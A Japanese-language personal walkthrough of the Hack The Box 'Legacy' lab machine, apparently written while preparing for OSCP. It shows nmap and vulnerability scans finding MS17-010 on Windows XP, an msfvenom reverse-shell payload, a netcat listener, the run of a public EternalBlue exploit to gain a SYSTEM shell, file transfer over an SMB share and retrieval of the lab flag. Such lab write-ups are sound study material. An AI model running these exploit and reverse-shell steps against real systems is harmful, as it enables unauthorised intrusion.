# legacy

* ping確認

  ```bash
  └─$ ping 10.10.10.4
  PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
  64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=285 ms
  64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=206 ms
  
  ```

  

* nmap実行

  ```bash
  nmap -sV 10.10.10.4
  
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 17:05 JST
  Nmap scan report for 10.10.10.4
  Host is up (0.40s latency).
  Not shown: 997 closed tcp ports (conn-refused)
  PORT    STATE SERVICE      VERSION
  135/tcp open  msrpc        Microsoft Windows RPC
  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
  Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds
  ```

  ```bash
  nmap -sV -p- 10.10.10.4
  ```

  

* searchsploitで脆弱性確認

  ```bash
  ─$ searchsploit Microsoft Windows RPC
  ------------------------------------------------- ---------------------------------
   Exploit Title                                   |  Path
  ------------------------------------------------- ---------------------------------
  Microsoft DNS RPC Service - 'extractQuotedChar() | windows/remote/16366.rb
  Microsoft DNS RPC Service - 'extractQuotedChar() | windows/remote/16748.rb
  Microsoft RPC DCOM Interface - Remote Overflow ( | windows/remote/16749.rb
  Microsoft Windows - 'Lsasrv.dll' RPC Remote Buff | windows/remote/293.c
  Microsoft Windows - 'RPC DCOM' Long Filename Ove | windows/remote/100.c
  Microsoft Windows - 'RPC DCOM' Remote (1)        | windows/remote/69.c
  Microsoft Windows - 'RPC DCOM' Remote (2)        | windows/remote/70.c
  Microsoft Windows - 'RPC DCOM' Remote (Universal | windows/remote/76.c
  Microsoft Windows - 'RPC DCOM' Remote Buffer Ove | windows/remote/64.c
  Microsoft Windows - 'RPC DCOM' Scanner (MS03-039 | windows/remote/97.c
  Microsoft Windows - 'RPC DCOM2' Remote (MS03-039 | windows/remote/103.c
  Microsoft Windows - 'RPC2' Universal / Denial of | windows/remote/109.c
  Microsoft Windows - DCE-RPC svcctl ChangeService | windows/dos/3453.py
  Microsoft Windows - DCOM RPC Interface Buffer Ov | windows/remote/22917.txt
  Microsoft Windows - DNS RPC Remote Buffer Overfl | windows/remote/3746.txt
  Microsoft Windows - Net-NTLMv2 Reflection DCOM/R | windows/local/45562.rb
  Microsoft Windows 10 1903/1809 - RPCSS Activatio | windows/local/47135.txt
  Microsoft Windows 2000/NT 4 - RPC Locator Servic | windows/remote/5.c
  Microsoft Windows 8.1 - DCOM DCE/RPC Local NTLM  | windows/local/37768.txt
  Microsoft Windows Message Queuing Service - RPC  | windows/remote/4745.cpp
  Microsoft Windows Message Queuing Service - RPC  | windows/remote/4934.c
  Microsoft Windows Server 2000 - RPC DCOM Interfa | windows/dos/61.c
  Microsoft Windows Server 2000 SP4 - DNS RPC Remo | windows/remote/3737.py
  Microsoft Windows XP/2000 - 'RPC DCOM' Remote (M | windows/remote/66.c
  Microsoft Windows XP/2000 - RPC Remote Non Exec  | windows/remote/117.c
  Microsoft Windows XP/2000/NT 4.0 - RPC Service D | windows/dos/21951.c
  Microsoft Windows XP/2000/NT 4.0 - RPC Service D | windows/dos/21952.c
  Microsoft Windows XP/2000/NT 4.0 - RPC Service D | windows/dos/21953.txt
  Microsoft Windows XP/2000/NT 4.0 - RPC Service D | windows/dos/21954.txt
  Microsoft Windows XP/2003 - RPCSS Service Isolat | windows/local/32892.txt
  ------------------------------------------------- ---------------------------------
  ```
  
  ```bash
  searchsploit Microsoft Windows netbios-ssn
  Exploits: No Results
  Shellcodes: No Results
  ```
  
  ```bash
  $ searchsploit Microsoft Windows XP microsoft-ds
  Exploits: No Results
  Shellcodes: No Results
  ```
  
  
  
* nmapの脆弱性スキャンも並行して実施

  ```bash
  └─$ nmap --script vuln -oA vuln-scan 10.10.10.4                                   
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 17:12 JST
  Nmap scan report for 10.10.10.4
  Host is up (0.59s latency).
  Not shown: 997 closed tcp ports (conn-refused)                                    
  PORT    STATE SERVICE
  135/tcp open  msrpc
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds                                                        
  Host script results:
  |_smb-vuln-ms10-054: false
  | smb-vuln-ms17-010: 
  |   VULNERABLE:
  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2017-0143
  |     Risk factor: HIGH
  |       A critical remote code execution vulnerability exists in Microsoft SMBv1
  |        servers (ms17-010).
  |           
  |     Disclosure date: 2017-03-14
  |     References:
  |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-annacrypt-attacks/
  |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
  |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
  
  Nmap done: 1 IP address (1 host up) scanned in 98.05 seconds
  
  ```

  

* CVE-2017-0143を中心に調査を進める
* 以下PoCを利用する

https://github.com/k4u5h41/MS17-010_CVE-2017-0143

```bash
# 環境整備
$ git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143.git   
$ pyenv versions                                                           
$ poetry init
$ poetry add impacket
$ poetry add pycrypto
$ poetry shell
```

```bash
# パッチチェック
python checker.py 10.10.10.4
```

※うまくChecker.pyが動かない.....

↓↓↓↓↓↓↓↓↓以降Writeupを参照↓↓↓↓↓↓↓↓↓↓↓↓↓↓

* 以下git cloneする

```bash
git clone https://github.com/helviojunior/MS17-010   
```

* MSFvenomを利用する（リバースシェルのpayloadを作成するため）
  ※OSCPではmeterpreterを使わなければ他は許されているそう

  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe > eternalblue.exe
  ```

  ※リバースシェルなので攻撃側のサーバー(kali)のtun0のIPアドレスを指定
  
* attac machineでlistenする

  ```bash
  nc -nlvp 4444
  ```

  

* exploitコードを動かす（コードの中身見たけどなにやってるか全くわからん）

  * まずpython2で動かすためにpoetry 環境を整備する。色々試した結果以下手順でpoetryのpythonバージョンを2.7.17にできた
  
    ```bash
    $ poetry init
    # ここでCompatible Python versions [^3.10]:  2.7.17に設定すること
    $ poetry env use ~/.pyenv/versions/2.7.17/bin/python
    $ poetry env list
    ms17-010-I9h2g7af-py2.7 (Activated)
    ms17-010-I9h2g7af-py3.10
    # あとは通常と同じ手順でライブラリaddして、poetry shellを実行する
    ```
  
  * 環境ができたので以下実行
  
  ```
  python send_and_execute.py 10.10.10.4 eternalblue.exe
  ```
  
  * リバースシェルが取得できる
  
  ```bash
  $ nc -nlvp 4444
  listening on [any] 4444 ...
  connect to [10.10.16.12] from (UNKNOWN) [10.10.10.4] 1039
  Microsoft Windows XP [Version 5.1.2600]
  (C) Copyright 1985-2001 Microsoft Corp.
  
  C:\WINDOWS\system32>
  ```
  
  * ユーザの権限を確認していく
  
    ```cmd
    C:\>whoami 
    whoami
    'whoami' is not recognized as an internal or external command,
    operable program or batch file.
    ```
  
    whoami実行できない
  
    ```cmd
    C:\>echo %username%
    echo %username%
    %username%
    ```
  
    usernameも表示できない
  
  * kaliがwhoami実行ファイルを持っているためターゲットマシーンにインストールする
  
    ```bash
    └─$ locate whoami.exe
    /usr/share/windows-resources/binaries/whoami.exe
    ```
  
    locateコマンド便利やわ...
  
  * netcatとpowershellもインストールされていないため、実行もできない。
    なのでSMBserverを転送用にセットアップする。
  
    ```bash
    $ locate smbserver.py           
    /usr/lib/python3/dist-packages/impacket/smbserver.py
    /usr/share/doc/python3-impacket/examples/smbserver.py
    ```
  
    kali優秀すぎるだろ....
  
  * SMBserverを起動する
  
    ```bash
    sudo /usr/share/doc/python3-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
    ```
  
  * 起動できたか確かめる
  
    ```bash
    $ smbclient //10.10.16.12/temp
    Password for [WORKGROUP\kali]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D     4096  Tue Jun 14 12:21:35 2022
      ..                                  D     4096  Tue Jun 14 12:21:35 2022
      mbenum                              D     4096  Tue Jun 14 12:21:35 2022
      nc.exe                             AN    59392  Wed Jul 17 18:31:43 2019
      radmin.exe                         AN   704512  Wed Jul 17 18:31:43 2019
      enumplus                            D     4096  Tue Jun 14 12:21:35 2022
      klogger.exe                        AN    23552  Wed Jul 17 18:31:43 2019
      whoami.exe                         AN    66560  Wed Jul 17 18:31:43 2019
      fgdump                              D     4096  Tue Jun 14 12:21:35 2022
      vncviewer.exe                      AN   364544  Wed Jul 17 18:31:43 2019
      plink.exe                          AN   311296  Wed Jul 17 18:31:43 2019
      exe2bat.exe                        AN    53248  Wed Jul 17 18:31:43 2019
      nbtenum                             D     4096  Tue Jun 14 12:21:35 2022
      fport                               D     4096  Tue Jun 14 12:21:35 2022
      wget.exe                           AN   308736  Wed Jul 17 18:31:43 2019
    
                    148529400 blocks of size 7680. 148529400 blocks available
    
    ```
  
  * ターゲットホストでwhoami.exeをtemp shareを利用して実行する
  
    ```cme
    C:\WINDOWS\system32>\\10.10.16.12\temp\whoami.exe
    \\10.10.16.12\temp\whoami.exe
    NT AUTHORITY\SYSTEM
    ```
  
    SYSTEMを持っているので権限昇格は不要
  
  * ファイルを探していく
  
    ```cmd
    C:\>dir user.txt /s
    dir user.txt /s
     Volume in drive C has no label.
     Volume Serial Number is 54BF-723B
    
     Directory of C:\Documents and Settings\john\Desktop
    
    16/03/2017  09:19 ��                32 user.txt
                   1 File(s)             32 bytes
    
         Total Files Listed:
                   1 File(s)             32 bytes
                   0 Dir(s)   6.342.041.600 bytes free
    ```
  
    このコマンド便利すぎる....
  
    ```cmd
    C:\Documents and Settings\john\Desktop>type user.txt
    type user.txt
    e69af0e4f443de7e36876fda4ec7644f
    ```
  
    typeコマンドも覚えましょね...
  
  * このままrootもいただいちゃいます
  
    ```cmd
    C:\>dir root.txt /s
    dir root.txt /s
     Volume in drive C has no label.
     Volume Serial Number is 54BF-723B
    
     Directory of C:\Documents and Settings\Administrator\Desktop
    
    16/03/2017  09:18 ��                32 root.txt
                   1 File(s)             32 bytes
    
         Total Files Listed:
                   1 File(s)             32 bytes
                   0 Dir(s)   6.342.090.752 bytes free
    
    ```
  
    

## 所感

* externalblueのexploitコードの中身をまるで理解できていない。どこかで理解したい。
* poetryでpythonの仮想環境を作る方法について少し詳しくなれたのは学び
* windowsのコマンド等これまで知識になかったものが多かったためcheetsheetへの記載必須
